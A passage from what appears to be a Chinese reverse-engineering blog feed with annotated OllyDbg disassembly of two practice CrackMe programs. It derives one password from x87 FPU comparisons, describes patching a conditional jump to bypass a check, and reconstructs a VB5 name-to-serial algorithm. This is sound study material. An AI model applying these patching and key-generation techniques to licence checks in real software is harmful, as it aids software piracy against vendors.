测试.004010A5</div><div class="line">004010A0  |.  B8 5C1B4800   mov eax,测试.00481B5C</div><div class="line">004010A5  |&gt;  50            push eax</div><div class="line">004010A6  |.  68 01000000   push 0x1</div><div class="line">004010AB  |.  BB A0134000   mov ebx,测试.004013A0</div><div class="line">004010B0  |.  E8 B4010000   call 测试.00401269</div><div class="line">004010B5  |.  83C4 10       add esp,0x10</div><div class="line">004010B8  |.  8945 E0       mov [local.8],eax</div><div class="line">004010BB  |.  8B5D E4       mov ebx,[local.7]</div><div class="line">004010BE  |.  85DB          test ebx,ebx</div><div class="line">004010C0  |.  74 09         je short 测试.004010CB</div><div class="line">004010C2  |.  53            push ebx</div><div class="line">004010C3  |.  E8 95010000   call 测试.0040125D</div><div class="line">004010C8  |.  83C4 04       add esp,0x4</div><div class="line">004010CB  |&gt;  DB45 E0       fild [local.8]                           ;  (641)10 -&gt; st0</div><div class="line">004010CE  |.  DD5D D8       fstp qword ptr ss:[ebp-0x28]             ;  st0 -&gt; ebp-28H</div><div class="line">004010D1  |.  DD45 E8       fld qword ptr ss:[ebp-0x18]              ;  [ebp-18H](十进制你的输入+520) -&gt; st0</div><div class="line">004010D4  |.  DC65 D8       fsub qword ptr ss:[ebp-0x28]             ;  st0 = st0 - [ebp-28H]  (641)10</div><div class="line">004010D7  |.  D9E4          ftst                                     ;  st0和0.0比较，据此设置FPU状态字C0,C2,C3位</div><div class="line">004010D9  |.  DFE0          fstsw ax</div><div class="line">004010DB  |.  F6C4 01       test ah,0x1</div><div class="line">004010DE  |.  74 02         je short 测试.004010E2</div><div class="line">004010E0  |.  D9E0          fchs                                     ;  st0改变符号位</div><div class="line">004010E2  |&gt;  DC1D 651B4800 fcomp qword ptr ds:[0x481B65]            ;  st0和[481B65](无限接近0的一个正浮点数)比较，据此设置FPU状态字C0,C2,C3位，并把st0弹到[481B65]</div><div class="line">004010E8  |.  DFE0          fstsw ax                                 ;  FPU状态字 -&gt; eax，根据下面可知，FPU状态字C0或C3为1均可</div><div class="line">004010EA  |.  F6C4 41       test ah,0x41                             ;  zf=0 -&gt; ah &amp; 0x41 != 0</div><div class="line">004010ED  |.  B8 00000000   mov eax,0x0</div><div class="line">004010F2  |.  0f95c0        setne al                                 ;  eax=1 -&gt; al=1 -&gt; zf=0</div><div class="line">004010F5  |.  8945 D0       mov [local.12],eax</div><div class="line">004010F8  |.  837D D0 01    cmp [local.12],0x1</div><div class="line">004010FC  |.  0F85 39000000 jnz 测试.0040113B                          ;  要求zf=1，即eax=0x1</div><div class="line">00401102  |.  BB 06000000   mov ebx,0x6</div><div class="line">00401107  |.  E8 F8FEFFFF   call 测试.00401004</div><div class="line">0040110C  |.  68 01030080   push 0x80000301</div><div class="line">00401111  |.  6A 00         push 0x0</div><div class="line">00401113  |.  68 00000000   push 0x0</div><div class="line">00401118  |.  68 04000080   push 0x80000004</div><div class="line">0040111D  |.  6A 00         push 0x0</div><div class="line">0040111F  |.  68 6D1B4800   push 测试.00481B6D                         ;  成功</div><div class="line">00401124  |.  68 04000000   push 0x4</div><div class="line">00401129  |.  BB 90164000   mov ebx,测试.00401690</div><div class="line">0040112E  |.  E8 36010000   call 测试.00401269</div><div class="line">00401133  |.  83C4 34       add esp,0x34</div><div class="line">00401136  |.  E9 34000000   jmp 测试.0040116F</div><div class="line">0040113B  |&gt;  BB 06000000   mov ebx,0x6</div><div class="line">00401140  |.  E8 BFFEFFFF   call 测试.00401004</div><div class="line">00401145  |.  68 01030080   push 0x80000301</div><div class="line">0040114A  |.  6A 00         push 0x0</div><div class="line">0040114C  |.  68 00000000   push 0x0</div><div class="line">00401151  |.  68 04000080   push 0x80000004</div><div class="line">00401156  |.  6A 00         push 0x0</div><div class="line">00401158  |.  68 721B4800   push 测试.00481B72                         ;  失败</div><div class="line">0040115D  |.  68 04000000   push 0x4</div></pre></td></tr></table></figure></p>
<p>那么回到上面的问题，ah的值是从哪来的，我们在<code>004010E8</code>处可以看到，FPU状态码进了eax<br>那么根据我们的判断<code>ah &amp; 0x41 != 0</code>，能得出对FPU状态字有什么要求呢？<br>我们看这张图<br><img src="http://ww1.sinaimg.cn/large/c0264382gy1fjo0im7jh7j20g70bqt93.jpg" alt=""></p>
<p>也就是说<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">    0100 0001</div><div class="line">&amp;   -x-- -yzt</div><div class="line">----------------</div><div class="line">    真</div><div class="line">其中x代表C3，y代表C2，z代表C1,t代表C0</div></pre></td></tr></table></figure></p>
<p>根据上面的判断，也就是说<strong>只能C3或C0为1</strong>  </p>
<ul>
<li>C3为1的话  <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">004010E2  |&gt;  DC1D 651B4800 fcomp qword ptr ds:[0x481B65]            ;  st0和[481B65](无限接近0的一个正浮点数)比较，据此设置FPU状态字C0,C2,C3位，并把st0弹到[481B65]</div></pre></td></tr></table></figure>
</li>
</ul>
<p>这段就是st0等于一个无限接近0的浮点数才能使C3为1，但是根据我们之前的<code>st0 = st0 = 你的输入+520-641</code>，st0不可能是等于一个无限接近0的浮点数，所以<strong>C3为1排除</strong>  <a href="http://x86.renejeschke.de/html/file_module_x86_id_87.html" target="_blank" rel="external">fcomp命令参考处</a></p>
<ul>
<li>C0为1的话<br>C0为1是怎么来的呢？只有两个地方涉及到了FPU状态字的改变，分别是<code>4010D7</code>和<code>4010E2</code><br><code>4010E2</code>处要使C0为1，必须st0小于那个无限接近0的浮点数，这个条件不足以我们判断，接着往上看<br><code>4010D7</code>处要使C0为1，必须st0等于0.0，也就是<code>你的输入+520-641=0</code>  <a href="http://x86.renejeschke.de/html/file_module_x86_id_123.html" target="_blank" rel="external">ftst命令参考处</a></li>
</ul>
<p>所以至此我们就得到了密码<br>密码+520-641=0      ==&gt;     密码=121<br><img src="http://ww1.sinaimg.cn/large/c0264382gy1fjo0ir8du4j20am070a9y.jpg" alt=""></p>
<p>这个CM怎么说呢，我刚开始是没想到会涉及到浮点寄存器的，因为我还没学这个，不过后来追到快判断的地方时，发现了FPU状态码进入eax参与过程了，然后查了关于FPU 状态寄存器的资料，就可以搞出来了</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这次找小伙伴要了他的一个CM，怎么说呢，这CM让我学到了不少，其实搞出来后感觉不难，就是有不少FPU浮点相关的指令和FPU寄存器完全没学过，查了不少资料，学到了很多&lt;br&gt;
    
    </summary>
    
      <category term="逆向" scheme="http://hacktech.cn/categories/%E9%80%86%E5%90%91/"/>
    
    
      <category term="CrackMe" scheme="http://hacktech.cn/tags/CrackMe/"/>
    
      <category term="逆向" scheme="http://hacktech.cn/tags/%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>160CrackMe练手 002</title>
    <link href="http://hacktech.cn/2017/09/16/160CrackMe-002.html"/>
    <id>http://hacktech.cn/2017/09/16/160CrackMe-002.html</id>
    <published>2017-09-16T06:29:51.000Z</published>
    <updated>2017-09-16T06:33:23.853Z</updated>
    
    <content type="html"><![CDATA[<p>首先查壳无壳，输入伪码报错，根据报错od查找字符串，定位到错误代码附近，可以看到有个条件跳转，改掉就可以爆破，接下来分析下注册算法，我们周围看看，从最近几个call看，并没有我们输入的用户名在堆栈中出现，那我们直接从这个函数开头往下找，一般一个函数开头是push ebp一段代码用来提升堆栈，找到后我们往下找，注意堆栈，直到我们输入的字符出现，开始细心往下跟<br><a id="more"></a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div><div class="line">188</div><div class="line">189</div><div class="line">190</div><div class="line">191</div><div class="line">192</div><div class="line">193</div><div class="line">194</div><div class="line">195</div><div class="line">196</div><div class="line">197</div><div class="line">198</div><div class="line">199</div><div class="line">200</div><div class="line">201</div><div class="line">202</div><div class="line">203</div><div class="line">204</div><div class="line">205</div><div class="line">206</div><div class="line">207</div><div class="line">208</div><div class="line">209</div><div class="line">210</div><div class="line">211</div><div class="line">212</div><div class="line">213</div><div class="line">214</div><div class="line">215</div><div class="line">216</div><div class="line">217</div><div class="line">218</div><div class="line">219</div><div class="line">220</div><div class="line">221</div><div class="line">222</div><div class="line">223</div><div class="line">224</div><div class="line">225</div><div class="line">226</div><div class="line">227</div><div class="line">228</div><div class="line">229</div><div class="line">230</div><div class="line">231</div><div class="line">232</div><div class="line">233</div><div class="line">234</div><div class="line">235</div><div class="line">236</div><div class="line">237</div><div class="line">238</div><div class="line">239</div><div class="line">240</div><div class="line">241</div><div class="line">242</div><div class="line">243</div><div class="line">244</div><div class="line">245</div><div class="line">246</div><div class="line">247</div><div class="line">248</div><div class="line">249</div><div class="line">250</div><div class="line">251</div><div class="line">252</div><div class="line">253</div><div class="line">254</div></pre></td><td class="code"><pre><div class="line">00402310   &gt; \55            push ebp</div><div class="line">00402311   .  8BEC          mov ebp,esp</div><div class="line">00402313   .  83EC 0C       sub esp,0xC</div><div class="line">00402316   .  68 26104000   push &lt;jmp.&amp;MSVBVM50.__vbaExceptHandler&gt;  ;  SE 处理程序安装</div><div class="line">0040231B   .  64:A1 0000000&gt;mov eax,dword ptr fs:[0]</div><div class="line">00402321   .  50            push eax                                 ;  Afkayas_.00402191</div><div class="line">00402322   .  64:8925 00000&gt;mov dword ptr fs:[0],esp</div><div class="line">00402329   .  81EC B0000000 sub esp,0xB0</div><div class="line">0040232F   .  53            push ebx</div><div class="line">00402330   .  56            push esi</div><div class="line">00402331   .  8B75 08       mov esi,dword ptr ss:[ebp+0x8]           ;  esi -&gt; ASCII &quot;2@&quot;</div><div class="line">00402334   .  57            push edi</div><div class="line">00402335   .  8BC6          mov eax,esi                              ;  eax -&gt; ASCII &quot;2@&quot;</div><div class="line">00402337   .  83E6 FE       and esi,-0x2</div><div class="line">0040233A   .  8965 F4       mov dword ptr ss:[ebp-0xC],esp</div><div class="line">0040233D   .  83E0 01       and eax,0x1</div><div class="line">00402340   .  8B1E          mov ebx,dword ptr ds:[esi]</div><div class="line">00402342   .  C745 F8 08104&gt;mov dword ptr ss:[ebp-0x8],Afkayas_.0040&gt;</div><div class="line">00402349   .  56            push esi</div><div class="line">0040234A   .  8945 FC       mov dword ptr ss:[ebp-0x4],eax           ;  Afkayas_.00402191</div><div class="line">0040234D   .  8975 08       mov dword ptr ss:[ebp+0x8],esi</div><div class="line">00402350   .  FF53 04       call dword ptr ds:[ebx+0x4]              ;  msvbvm50.7404C5C8</div><div class="line">00402353   .  8B83 10030000 mov eax,dword ptr ds:[ebx+0x310]</div><div class="line">00402359   .  33FF          xor edi,edi</div><div class="line">0040235B   .  56            push esi</div><div class="line">0040235C   .  897D E8       mov dword ptr ss:[ebp-0x18],edi</div><div class="line">0040235F   .  897D E4       mov dword ptr ss:[ebp-0x1C],edi</div><div class="line">00402362   .  897D E0       mov dword ptr ss:[ebp-0x20],edi</div><div class="line">00402365   .  897D DC       mov dword ptr ss:[ebp-0x24],edi</div><div class="line">00402368   .  897D D8       mov dword ptr ss:[ebp-0x28],edi</div><div class="line">0040236B   .  897D D4       mov dword ptr ss:[ebp-0x2C],edi</div><div class="line">0040236E   .  897D C4       mov dword ptr ss:[ebp-0x3C],edi</div><div class="line">00402371   .  897D B4       mov dword ptr ss:[ebp-0x4C],edi</div><div class="line">00402374   .  897D A4       mov dword ptr ss:[ebp-0x5C],edi</div><div class="line">00402377   .  897D 94       mov dword ptr ss:[ebp-0x6C],edi</div><div class="line">0040237A   .  8985 40FFFFFF mov dword ptr ss:[ebp-0xC0],eax          ;  Afkayas_.00402191</div><div class="line">00402380   .  FFD0          call eax                                 ;  Afkayas_.00402191</div><div class="line">00402382   .  8D4D D4       lea ecx,dword ptr ss:[ebp-0x2C]</div><div class="line">00402385   .  50            push eax                                 ;  Afkayas_.00402191</div><div class="line">00402386   .  51            push ecx</div><div class="line">00402387   .  FF15 0C414000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaObjSe&gt;;  msvbvm50.__vbaObjSet</div><div class="line">0040238D   .  8B9B 00030000 mov ebx,dword ptr ds:[ebx+0x300]</div><div class="line">00402393   .  56            push esi</div><div class="line">00402394   .  8985 50FFFFFF mov dword ptr ss:[ebp-0xB0],eax          ;  Afkayas_.00402191</div><div class="line">0040239A   .  899D 3CFFFFFF mov dword ptr ss:[ebp-0xC4],ebx</div><div class="line">004023A0   .  FFD3          call ebx</div><div class="line">004023A2   .  8D55 DC       lea edx,dword ptr ss:[ebp-0x24]</div><div class="line">004023A5   .  50            push eax                                 ;  Afkayas_.00402191</div><div class="line">004023A6   .  52            push edx</div><div class="line">004023A7   .  FF15 0C414000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaObjSe&gt;;  msvbvm50.__vbaObjSet</div><div class="line">004023AD   .  8BD8          mov ebx,eax                              ;  Afkayas_.00402191</div><div class="line">004023AF   .  8D4D E8       lea ecx,dword ptr ss:[ebp-0x18]</div><div class="line">004023B2   .  51            push ecx</div><div class="line">004023B3   .  53            push ebx</div><div class="line">004023B4   .  8B03          mov eax,dword ptr ds:[ebx]</div><div class="line">004023B6   .  FF90 A0000000 call dword ptr ds:[eax+0xA0]</div><div class="line">004023BC   .  3BC7          cmp eax,edi</div><div class="line">004023BE   .  7D 12         jge short Afkayas_.004023D2</div><div class="line">004023C0   .  68 A0000000   push 0xA0</div><div class="line">004023C5   .  68 5C1B4000   push Afkayas_.00401B5C</div><div class="line">004023CA   .  53            push ebx</div><div class="line">004023CB   .  50            push eax                                 ;  Afkayas_.00402191</div><div class="line">004023CC   .  FF15 04414000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaHresu&gt;;  msvbvm50.__vbaHresultCheckObj</div><div class="line">004023D2   &gt;  56            push esi</div><div class="line">004023D3   .  FF95 3CFFFFFF call dword ptr ss:[ebp-0xC4]</div><div class="line">004023D9   .  8D55 D8       lea edx,dword ptr ss:[ebp-0x28]</div><div class="line">004023DC   .  50            push eax                                 ;  Afkayas_.00402191</div><div class="line">004023DD   .  52            push edx</div><div class="line">004023DE   .  FF15 0C414000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaObjSe&gt;;  msvbvm50.__vbaObjSet</div><div class="line">004023E4   .  8BD8          mov ebx,eax                              ;  Afkayas_.00402191</div><div class="line">004023E6   .  8D4D E4       lea ecx,dword ptr ss:[ebp-0x1C]</div><div class="line">004023E9   .  51            push ecx</div><div class="line">004023EA   .  53            push ebx</div><div class="line">004023EB   .  8B03          mov eax,dword ptr ds:[ebx]</div><div class="line">004023ED   .  FF90 A0000000 call dword ptr ds:[eax+0xA0]</div><div class="line">004023F3   .  3BC7          cmp eax,edi</div><div class="line">004023F5   .  7D 12         jge short Afkayas_.00402409</div><div class="line">004023F7   .  68 A0000000   push 0xA0</div><div class="line">004023FC   .  68 5C1B4000   push Afkayas_.00401B5C</div><div class="line">00402401   .  53            push ebx</div><div class="line">00402402   .  50            push eax                                 ;  Afkayas_.00402191</div><div class="line">00402403   .  FF15 04414000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaHresu&gt;;  msvbvm50.__vbaHresultCheckObj</div><div class="line">00402409   &gt;  8B95 50FFFFFF mov edx,dword ptr ss:[ebp-0xB0]</div><div class="line">0040240F   .  8B45 E4       mov eax,dword ptr ss:[ebp-0x1C]          ;  用户名 -&gt; eax</div><div class="line">00402412   .  50            push eax                                 ; /用户名 -&gt; 堆栈</div><div class="line">00402413   .  8B1A          mov ebx,dword ptr ds:[edx]               ; |</div><div class="line">00402415   .  FF15 E4404000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaLenBs&gt;; \len(用户名) -&gt; eax</div><div class="line">0040241B   .  8BF8          mov edi,eax                              ;  len(用户名) -&gt; edi</div><div class="line">0040241D   .  8B4D E8       mov ecx,dword ptr ss:[ebp-0x18]          ;  用户名 -&gt; ecx</div><div class="line">00402420   .  69FF FB7C0100 imul edi,edi,0x17CFB                     ;  len(用户名) * 0x17CFB ==&gt; edi=A6ADD</div><div class="line">00402426   .  51            push ecx                                 ; /String = NULL</div><div class="line">00402427   .  0F80 91020000 jo Afkayas_.004026BE                     ; |</div><div class="line">0040242D   .  FF15 F8404000 call dword ptr ds:[&lt;&amp;MSVBVM50.#rtcAnsiVa&gt;; \用户名去掉首字母 -&gt; edx</div><div class="line">00402433   .  0FBFD0        movsx edx,ax</div><div class="line">00402436   .  03FA          add edi,edx</div><div class="line">00402438   .  0F80 80020000 jo Afkayas_.004026BE</div><div class="line">0040243E   .  57            push edi                                 ;  len(用户名) * 0x17CFB 入栈-&gt; ebp-D4</div><div class="line">0040243F   .  FF15 E0404000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaStrI4&gt;;  十进制(len(用户名) * 0x17CFB) + 首字母十进制ascii值  -&gt; eax</div><div class="line">00402445   .  8BD0          mov edx,eax                              ;  Afkayas_.00402191</div><div class="line">00402447   .  8D4D E0       lea ecx,dword ptr ss:[ebp-0x20]</div><div class="line">0040244A   .  FF15 70414000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaStrMo&gt;;  msvbvm50.__vbaStrMove</div><div class="line">00402450   .  8BBD 50FFFFFF mov edi,dword ptr ss:[ebp-0xB0]</div><div class="line">00402456   .  50            push eax                                 ;  Afkayas_.00402191</div><div class="line">00402457   .  57            push edi                                 ;  十进制(len(用户名) * 0x17CFB) + 首字母十进制ascii值  入栈  -&gt; ebp-D4</div><div class="line">00402458   .  FF93 A4000000 call dword ptr ds:[ebx+0xA4]</div><div class="line">0040245E   .  85C0          test eax,eax                             ;  Afkayas_.00402191</div><div class="line">00402460   .  7D 12         jge short Afkayas_.00402474</div><div class="line">00402462   .  68 A4000000   push 0xA4</div><div class="line">00402467   .  68 5C1B4000   push Afkayas_.00401B5C</div><div class="line">0040246C   .  57            push edi</div><div class="line">0040246D   .  50            push eax                                 ;  Afkayas_.00402191</div><div class="line">0040246E   .  FF15 04414000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaHresu&gt;;  msvbvm50.__vbaHresultCheckObj</div><div class="line">00402474   &gt;  8D45 E0       lea eax,dword ptr ss:[ebp-0x20]</div><div class="line">00402477   .  8D4D E4       lea ecx,dword ptr ss:[ebp-0x1C]</div><div class="line">0040247A   .  50            push eax                                 ;  Afkayas_.00402191</div><div class="line">0040247B   .  8D55 E8       lea edx,dword ptr ss:[ebp-0x18]</div><div class="line">0040247E   .  51            push ecx</div><div class="line">0040247F   .  52            push edx</div><div class="line">00402480   .  6A 03         push 0x3</div><div class="line">00402482   .  FF15 5C414000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaFreeS&gt;;  msvbvm50.__vbaFreeStrList</div><div class="line">00402488   .  83C4 10       add esp,0x10</div><div class="line">0040248B   .  8D45 D4       lea eax,dword ptr ss:[ebp-0x2C]</div><div class="line">0040248E   .  8D4D D8       lea ecx,dword ptr ss:[ebp-0x28]</div><div class="line">00402491   .  8D55 DC       lea edx,dword ptr ss:[ebp-0x24]</div><div class="line">00402494   .  50            push eax                                 ;  Afkayas_.00402191</div><div class="line">00402495   .  51            push ecx</div><div class="line">00402496   .  52            push edx</div><div class="line">00402497   .  6A 03         push 0x3</div><div class="line">00402499   .  FF15 F4404000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaFreeO&gt;;  msvbvm50.__vbaFreeObjList</div><div class="line">0040249F   .  8B06          mov eax,dword ptr ds:[esi]</div><div class="line">004024A1   .  83C4 10       add esp,0x10</div><div class="line">004024A4   .  56            push esi</div><div class="line">004024A5   .  FF90 04030000 call dword ptr ds:[eax+0x304]</div><div class="line">004024AB   .  8B1D 0C414000 mov ebx,dword ptr ds:[&lt;&amp;MSVBVM50.__vbaOb&gt;;  msvbvm50.__vbaObjSet</div><div class="line">004024B1   .  50            push eax                                 ;  Afkayas_.00402191</div><div class="line">004024B2   .  8D45 DC       lea eax,dword ptr ss:[ebp-0x24]</div><div class="line">004024B5   .  50            push eax                                 ;  Afkayas_.00402191</div><div class="line">004024B6   .  FFD3          call ebx                                 ;  &lt;&amp;MSVBVM50.__vbaObjSet&gt;</div><div class="line">004024B8   .  8BF8          mov edi,eax                              ;  Afkayas_.00402191</div><div class="line">004024BA   .  8D55 E8       lea edx,dword ptr ss:[ebp-0x18]</div><div class="line">004024BD   .  52            push edx</div><div class="line">004024BE   .  57            push edi</div><div class="line">004024BF   .  8B0F          mov ecx,dword ptr ds:[edi]</div><div class="line">004024C1   .  FF91 A0000000 call dword ptr ds:[ecx+0xA0]</div><div class="line">004024C7   .  85C0          test eax,eax                             ;  Afkayas_.00402191</div><div class="line">004024C9   .  7D 12         jge short Afkayas_.004024DD</div><div class="line">004024CB   .  68 A0000000   push 0xA0</div><div class="line">004024D0   .  68 5C1B4000   push Afkayas_.00401B5C</div><div class="line">004024D5   .  57            push edi</div><div class="line">004024D6   .  50            push eax                                 ;  Afkayas_.00402191</div><div class="line">004024D7   .  FF15 04414000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaHresu&gt;;  msvbvm50.__vbaHresultCheckObj</div><div class="line">004024DD   &gt;  56            push esi</div><div class="line">004024DE   .  FF95 40FFFFFF call dword ptr ss:[ebp-0xC0]</div><div class="line">004024E4   .  50            push eax                                 ;  Afkayas_.00402191</div><div class="line">004024E5   .  8D45 D8       lea eax,dword ptr ss:[ebp-0x28]</div><div class="line">004024E8   .  50            push eax                                 ;  Afkayas_.00402191</div><div class="line">004024E9   .  FFD3          call ebx</div><div class="line">004024EB   .  8BF0          mov esi,eax                              ;  Afkayas_.00402191</div><div class="line">004024ED   .  8D55 E4       lea edx,dword ptr ss:[ebp-0x1C]</div><div class="line">004024F0   .  52            push edx</div><div class="line">004024F1   .  56            push esi</div><div class="line">004024F2   .  8B0E          mov ecx,dword ptr ds:[esi]</div><div class="line">004024F4   .  FF91 A0000000 call dword ptr ds:[ecx+0xA0]</div><div class="line">004024FA   .  85C0          test eax,eax                             ;  Afkayas_.00402191</div><div class="line">004024FC   .  7D 12         jge short Afkayas_.00402510</div><div class="line">004024FE   .  68 A0000000   push 0xA0</div><div class="line">00402503   .  68 5C1B4000   push Afkayas_.00401B5C</div><div class="line">00402508   .  56            push esi</div><div class="line">00402509   .  50            push eax                                 ;  Afkayas_.00402191</div><div class="line">0040250A   .  FF15 04414000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaHresu&gt;;  msvbvm50.__vbaHresultCheckObj</div><div class="line">00402510   &gt;  8B45 E8       mov eax,dword ptr ss:[ebp-0x18]          ;  user32.77D2BBF7</div><div class="line">00402513   .  8B4D E4       mov ecx,dword ptr ss:[ebp-0x1C]</div><div class="line">00402516   .  8B3D 00414000 mov edi,dword ptr ds:[&lt;&amp;MSVBVM50.__vbaSt&gt;;  十进制(len(用户名) * 0x17CFB) + 首字母十进制ascii值 -&gt; ecx       密码 -&gt; eax</div><div class="line">0040251C   .  50            push eax                                 ;  Afkayas_.00402191</div><div class="line">0040251D   .  68 701B4000   push Afkayas_.00401B70                   ;  &quot;AKA-&quot;入栈</div><div class="line">00402522   .  51            push ecx                                 ; /十进制(len(用户名) * 0x17CFB) + 首字母十进制ascii值 入栈</div><div class="line">00402523   .  FFD7          call edi                                 ; \&quot;AKA-&quot;+&quot;十进制(len(用户名) * 0x17CFB) + 首字母十进制ascii值&quot;   -&gt;  eax</div><div class="line">00402525   .  8B1D 70414000 mov ebx,dword ptr ds:[&lt;&amp;MSVBVM50.__vbaSt&gt;;  msvbvm50.__vbaStrMove</div><div class="line">0040252B   .  8BD0          mov edx,eax                              ;  Afkayas_.00402191</div><div class="line">0040252D   .  8D4D E0       lea ecx,dword ptr ss:[ebp-0x20]</div><div class="line">00402530   .  FFD3          call ebx                                 ;  &lt;&amp;MSVBVM50.__vbaStrMove&gt;</div><div class="line">00402532   .  50            push eax                                 ;  Afkayas_.00402191</div><div class="line">00402533   .  FF15 28414000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaStrCm&gt;;  msvbvm50.__vbaStrCmp</div><div class="line">00402539   .  8BF0          mov esi,eax                              ;  Afkayas_.00402191</div><div class="line">0040253B   .  8D55 E0       lea edx,dword ptr ss:[ebp-0x20]</div><div class="line">0040253E   .  F7DE          neg esi</div><div class="line">00402540   .  8D45 E8       lea eax,dword ptr ss:[ebp-0x18]</div><div class="line">00402543   .  52            push edx</div><div class="line">00402544   .  1BF6          sbb esi,esi</div><div class="line">00402546   .  8D4D E4       lea ecx,dword ptr ss:[ebp-0x1C]</div><div class="line">00402549   .  50            push eax                                 ;  Afkayas_.00402191</div><div class="line">0040254A   .  46            inc esi</div><div class="line">0040254B   .  51            push ecx</div><div class="line">0040254C   .  6A 03         push 0x3</div><div class="line">0040254E   .  F7DE          neg esi</div><div class="line">00402550   .  FF15 5C414000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaFreeS&gt;;  msvbvm50.__vbaFreeStrList</div><div class="line">00402556   .  83C4 10       add esp,0x10</div><div class="line">00402559   .  8D55 D8       lea edx,dword ptr ss:[ebp-0x28]</div><div class="line">0040255C   .  8D45 DC       lea eax,dword ptr ss:[ebp-0x24]</div><div class="line">0040255F   .  52            push edx</div><div class="line">00402560   .  50            push eax                                 ;  Afkayas_.00402191</div><div class="line">00402561   .  6A 02         push 0x2</div><div class="line">00402563   .  FF15 F4404000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaFreeO&gt;;  msvbvm50.__vbaFreeObjList</div><div class="line">00402569   .  83C4 0C       add esp,0xC</div><div class="line">0040256C   .  B9 04000280   mov ecx,0x80020004</div><div class="line">00402571   .  B8 0A000000   mov eax,0xA</div><div class="line">00402576   .  894D 9C       mov dword ptr ss:[ebp-0x64],ecx</div><div class="line">00402579   .  66:85F6       test si,si</div><div class="line">0040257C   .  8945 94       mov dword ptr ss:[ebp-0x6C],eax          ;  Afkayas_.00402191</div><div class="line">0040257F   .  894D AC       mov dword ptr ss:[ebp-0x54],ecx</div><div class="line">00402582   .  8945 A4       mov dword ptr ss:[ebp-0x5C],eax          ;  Afkayas_.00402191</div><div class="line">00402585   .  894D BC       mov dword ptr ss:[ebp-0x44],ecx</div><div class="line">00402588   .  8945 B4       mov dword ptr ss:[ebp-0x4C],eax          ;  Afkayas_.00402191</div><div class="line">0040258B   .  74 58         je short Afkayas_.004025E5</div><div class="line">0040258D   .  68 801B4000   push 